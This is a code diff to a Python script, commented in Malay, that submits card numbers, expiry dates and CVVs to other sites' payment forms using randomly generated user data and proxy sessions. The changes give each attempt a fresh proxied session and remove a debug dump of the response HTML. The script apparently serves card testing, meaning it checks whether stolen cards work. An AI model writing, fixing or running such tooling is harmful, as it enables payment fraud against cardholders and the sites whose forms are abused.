@@ -337,7 +337,8 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
 
 def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
     base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
-    session, proxy_url = site_data.get('session'), site_data.get('proxy_url')
+    # GUNA SESSION BARU YANG BERSIH SUPAYA TAK CONFLICT QFKEY LAMA
+    session = create_session(site_data.get('proxy_url'))
     
     ccnum = clean_card_number(ccnum)
     user_data = generate_random_user_data()
@@ -363,12 +364,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             soup_resp = BeautifulSoup(response.text, 'html.parser')
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
-            
-            # PRINT HTML CONTENT SUPAYA KITA BOLEH TENGOK SALAH MANA
-            logging.info("="*50)
-            logging.info("HTML CONTENT SELEPAS SUBMIT PERTAMA:")
-            logging.info(response.text[:5000]) # Print 5000 karakter pertama
-            logging.info("="*50)
             
             # CARI FORM CONFIRM YANG BETUL
             confirm_form = soup_resp.find('form', {'id': 'Confirm'})
